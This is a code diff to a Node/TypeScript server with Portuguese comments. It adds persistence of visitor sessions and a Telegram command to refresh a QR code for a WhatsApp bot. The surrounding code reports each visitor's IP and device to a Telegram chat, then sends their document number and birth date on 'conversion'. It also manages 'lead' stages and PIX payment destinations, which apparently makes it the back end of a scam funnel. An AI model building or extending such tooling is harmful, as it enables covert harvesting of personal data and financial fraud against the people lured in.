@@ -56,18 +56,28 @@ let currentConfig = {
   withdrawalFeePercent: 0.0 // % por saque
 };
 
-// Sessions state for Telegram tracking
-const sessions = new Map<string, {
-  messageId: number,
-  startTime: number,
-  lastHeartbeat: number,
-  ip: string,
-  device: string,
-  location: string,
-  converted: boolean,
-  docValue: string,
-  birthDate: string
-}>();
+// Sessions state for Telegram tracking (Persisted)
+const sessions = new Map<string, any>();
+const VISITORS_FILE = path.join(process.cwd(), 'visitor-sessions.json');
+
+function loadVisitors() {
+  try {
+    if (fs.existsSync(VISITORS_FILE)) {
+      const data = JSON.parse(fs.readFileSync(VISITORS_FILE, 'utf-8'));
+      Object.entries(data).forEach(([k, v]) => sessions.set(k, v));
+      console.log(`📂 [SISTEMA] ${sessions.size} sessões de visitantes carregadas.`);
+    }
+  } catch (e) { }
+}
+
+function saveVisitors() {
+  try {
+    const obj = Object.fromEntries(sessions);
+    fs.writeFileSync(VISITORS_FILE, JSON.stringify(obj, null, 2));
+  } catch (e) { }
+}
+
+loadVisitors();
 
 // Bot states for interactive commands
 const botStates = new Map<number, { action: string, data?: any }>();
@@ -547,6 +557,7 @@ app.post("/api/v1/session/start", async (req, res) => {
   const startTime = Date.now();
   const messageId = await sendTelegram(`<b>👤 NOVO VISITANTE</b>\n\n<b>IP:</b> ${ip}\n<b>Device:</b> ${device}\n<b>Status:</b> 🟢 Navegando...`);
   sessions.set(userId, { messageId: messageId || 0, startTime, lastHeartbeat: startTime, ip: String(ip), device, location: location || 'Brasil', converted: false, docValue: "", birthDate: "" });
+  saveVisitors();
   res.json({ status: "started", userId });
 });
 
@@ -566,6 +577,7 @@ app.post("/api/v1/session/convert", async (req, res) => {
     session.birthDate = details.birthDate;
     const msg = `<b>🔥 CONVERSÃO!</b>\n\n<b>IP:</b> ${session.ip}\n<b>Documento:</b> ${details.docValue}\n<b>Nascimento:</b> ${details.birthDate}\n<b>Status:</b> ✅ NO WHATSAPP`;
     await sendTelegram(msg, session.messageId || undefined);
+    saveVisitors();
     res.json({ status: "converted" });
   } else res.json({ status: "ignored" });
 });
@@ -954,6 +966,10 @@ async function startTelegramPolling() {
           const chatId = parts[2];
           fs.writeFileSync(`cmd-etapa-${Date.now()}.json`, JSON.stringify({ etapa: num, chatId }));
           await sendTelegram(`✅ <b>SOLICITAÇÃO ENVIADA</b>\n\nComando para liberar <b>Etapa ${num}</b> enviado para o lead <code>${chatId}</code>.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
+        }
+        else if (text === "cmd:refresh_qr") {
+          fs.writeFileSync('refresh-qr.json', JSON.stringify({ requestedAt: Date.now() }));
+          await sendTelegram(`🔄 <b>SOLICITAÇÃO RECEBIDA</b>\n\nGerando novo QR Code para o robô... Aguarde alguns segundos.`, msgId);
         }
         else if (text.startsWith("pix_dest:")) {
           const parts = text.split(":");
